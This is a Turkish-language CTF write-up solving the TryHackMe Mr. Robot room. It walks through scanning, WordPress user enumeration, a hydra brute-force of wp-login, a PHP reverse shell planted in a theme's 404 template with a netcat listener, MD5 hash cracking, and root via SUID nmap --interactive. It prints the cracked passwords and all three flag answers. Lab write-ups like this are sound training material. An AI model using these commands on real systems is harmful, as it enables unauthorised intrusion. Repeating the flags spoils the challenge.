# TryHackMe_Mr.Robot-CTF
<h3>TryHackMe Mr.Robot CTF Çözümü</h3>

1- Görev Tanımı: ![Gorev](Pictures/1.png) <br>
2- Tanım: 3 adet anahtar bulmamız gerekiyor. Vpn konfigürasyonlarımızı yapıp "start machine" butonuna tıklayalım. <br>
Nmap Taraması: ![nmap](Pictures/2.png) <br>
3- Nmap taramamızı yapalım. Çıkan sonuçlara bakıldığında ssh, http, https portlarının açık olduğunu görüyoruz yani ekstrem bir durum yok. <br>
4- Web sitesini inceleyelim. <br>
Web Sitesi: ![web](Pictures/3.png) <br>
5- Bu seçeneklere gidip bilgiler edinebilirsiniz. Diziye yönelik kareler ve videolar var yine de göz atmanızı öneririm. <br>
Robots: ![robots.txt](Pictures/4.png) <br>
6- Robots.txt dosyasına curl ile eriştiğimizde anahtarlarımızdan ilki olan "key-1-of-3.txt" dosyasını görüyoruz. Bunu cat ile okuyalım. <br>
Anahtar 1: ![key1](Pictures/5.png) <br>
7- İlk anahtarımızı bulduk. "073403c8a58a1f80d943455fb30724b9" <br>
8- Dikkat etmemiz gereken bir dosya daha var: "fsociety.dic". Bu dosya wordlist'tir. Bu da demek oluyor ki bir yerlerde brute force(kaba kuvvet saldırısı) yapacağız. Bu dosyayı kali'mize indirmemizde fayda var. Hemen indirelim <br>
Wordlist İndirme: ![fsociety.dic](Pictures/6.png) <br>
9- curl http://10.10.129.160/fsocity.dic -o fsociety.dic komutuyla dosyamızı indirelim. <br>
fsociety dosya içeriği: ![fsociety](Pictures/7.png) <br>
10- cat komutu ile okuduğumuzda wordlistimizi görüyoruz. Bu dosya kenarda dursun biz dizin taramasıyla devam edelim. <br>
Dizin Taraması: ![gobuster](Pictures/8.png) <br>
11- gobuster dir -u http://10.10.129.160 -w /usr/share/wordlists/dirb/common.txt komutuyla dizin taraması yapalım. <br>
12- Çıktıda, birçok wp- ile başlayan dizin/dosya görüyoruz. Bu, sitenin bir WordPress olduğunu kesinleştiriyor. Özellikle dikkat etmemiz gerekenler: /dashboard (Status: 302) $\rightarrow$ /wp-admin/ adresine yönlendiriyor. /login (Status: 302) $\rightarrow$ /wp-login.php adresine yönlendiriyor. /wp-login (Status: 200) $\rightarrow$ giriş sayfasını doğrudan gösteriyor. Bir sonraki adım, WordPress kurulumuna sızmak ve ikinci anahtarımızı bulmak için bir kullanıcı adı ve şifre elde etmek ki bunu da brute force ile halledeceğiz. <br>
WPScan: ![wordpress](Pictures/9.png) <br>
13- WordPress'te kullanıcı adlarını bulmak için genellikle WPScan aracını kullanırız. WPScan; kullanıcı adlarını, savunmasız eklentileri ve temaları bulmada çok etkilidir. <br>
14- wpscan --url http://10.10.129.160 --enumerate u komutuyla WPScan taraması başlatalım. <br>
<b>NOT:<b> ip bölümlerine lütfen CTF'inizin ip'sini yazın. <br>
15- WPScan çıktısına baktığımızda "elliot" isimli bir kullanıcı adı görüyoruz. Şaşırmadık tabii, diziyi izlediyseniz tahmin etmesi zor değil :) <br>
WordPress: ![wordpress](Pictures/10.png) <br>

16- http://10.10.129.160/author/elliot/ URL'ine gidelim. Bu, WordPress'in yazar ID'si 1 olan kullanıcının adının elliot olduğunu onayladığı anlamına gelir. Şimdi brute force kısmına geçebiliriz ama geçmeden önce fsociety.dic dosyamızın içeriğine dikkat ettiyseniz çok fazla tekrarlanan kelimeler var. Bunu sade hale getirelim. <br>
17- cat fsociety.dic | sort -u > unique_fsociety.dic komutuyla dosyamızda tekrar eden kelimeleri çıkaralım. <br>
Brute Force: ![BruteF](Pictures/11.png) <br>
18- hydra -l elliot -P unique_fsociety.dic 10.10.129.160 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered for the username" komutuyla brute force işlemini gerçekleştirelim. WPScan kullanmak isterseniz eğer: wpscan --url http://10.10.129.160 --usernames elliot --passwords fsociety.dic <br>
19- "[80][http-post-form] host: 10.10.129.160   login: elliot   password: ER28-0652" şu çıktıya dikkat edersek, parolayı kırdığımızı göreceksiniz. WordPress'e bu bilgilerle giriş yapalım. Daha önce bulduğumuz http://10.10.129.160/wp-login.php URL'ine gidelim. <br>
Port Dinleme: ![netcat](Pictures/12.png) <br>
20- nc -nvlp 4444 ile 4444 portunu dinleyelim. Bu terminal sekmesi dursun, kapatmayın lütfen. <br>
WP Admin: ![Panel](Pictures/14.png) <br>
21- WP paneline giriş yaptık. Panele girdikten sonra, sol menüden Görünüm (Appearance) $\rightarrow$ Tema Düzenleyici (Theme Editor)'ye gidin. <br>
Template: ![template](Pictures/15.png) <br>
22- Yeşil ok ile gösterdiğim "404 template" seçeneğine tıklayıp dosyadaki tüm mevcut kodu silin ve yerine, kendi IP adresiniz ve portunuz ile özelleştirilmiş bir php reverse shell Kodu yapıştırın. <b>Kodlara wp_payload.txt dosyasından ulaşabilirsiniz.</b> <br>
Kod: ![Code](Pictures/16.png) <br>
23- Kodlarımızı yazıp "Update" butonuna tıkladıktan sonra payload'umuzu tetiklemek için http://10.10.129.160/wp-content/themes/twentyfifteen/404.php adresine gidin. <br> 
Shell: ![shell](Pictures/17.png) <br>
24- Terminalimize baktığımızda reverse shell bağlantımızın kurulduğunu göreceksiniz. <br>
25- python -c 'import pty; pty.spawn("/bin/bash")' komutuyla kabuğumuzu geliştirelim. <br>
Komut: ![c1](Pictures/18.png) <br>
Komut: ![c2](Pictures/19.png) <br>
26- "key-2-of-3.txt" dosyasını okuyamıyoruz çünkü yetkimiz yok. Kullanıcı değiştirmemiz gerekiyor. <br>
27- password.raw-md5: Bu, robot kullanıcısına geçiş yapmak için ihtiyacımız olan bir ipucudur. Dosyanın okuma yetkisi var (-rw-r--r--) yani daemon kullanıcısı olarak bu dosyayı okuyabiliriz. <br>
Cat: ![cat](Pictures/21.png) <br>
28- password.raw-md5 dosyasının içeriği: c3fcd3d76192e4007dfb496cca67e13b ve bu, robot kullanıcısının parolasına ait MD5 hash'idir. <br>
29- Elde ettiğimiz hash'i online toollar ile text haline getirelim. Google'a "MD5 decode" yazıp herhangi bir siteye gidip decode edelim. <br>
Decode: ![hashtotext](Pictures/22.png) <br>
30- Decode ettiğimizde: "abcdefghijklmnopqrstuvwxyz" text'ini alırız. <br>
Kullanıcı Değişimi: ![su](Pictures/23.png) <br>
31- su - robot komutunu yazıp parolaya da "abcdefghijklmnopqrstuvwxyz" yazıp kullanıcı değiştirelim. "whoami" yazarak test edebilirsiniz. <br>
Anahtar 2: ![Key2](Pictures/24.png) <br>
32- Tebrikler, artık ikinci anahtarı ("822c73956184f694993bede3eb39f959") okuyabiliyoruz. Devam edelim
Zafiyet: ![vuln](Pictures/25.png) <br>
33- find / -perm -u=s -type f 2>/dev/null komutuyla sistemde, kullanıcıların normalde root yetkisiyle çalıştırılması gereken programları kendi yetkileriyle çalıştırmasına izin veren SUID (Set User ID) bit'i ayarlanmış dosyaları arayalım. Bu, yetki yükseltme için en yaygın yoldur.
34- Listeye baktığımızda önemli bir çıktıyı göreceğiz: /usr/local/bin/nmap
Nmap: ![nmap](Pictures/26.png) <br>
35- nmap --interactive komutunu yazarak nmap'in kendi komut istemine düşelim. <br>
Root: ![root](Pictures/27.png) <br>
36- !sh komutunu yazarak zafiyetten yararlanalım. Nmap isteminde, bir kabuk çalıştırmasını talep etmelisin. SUID bit'i ayarlı olduğu için bu kabuk root yetkisine sahip olacaktır. Artık Root kullanıcısıyız <br>
Anahtar 3: ![Key3](Pictures/28.png) <br>
37- Üçüncü anahtarımızı ("04787ddef27c3dee1ee161b21670b4e4") bulduk. <br>
<b>Okuduğunuz için teşekkür ederim.</b> 
<b>https://www.linkedin.com/in/albora-dogan-deniz-4a56a21b8/</b>
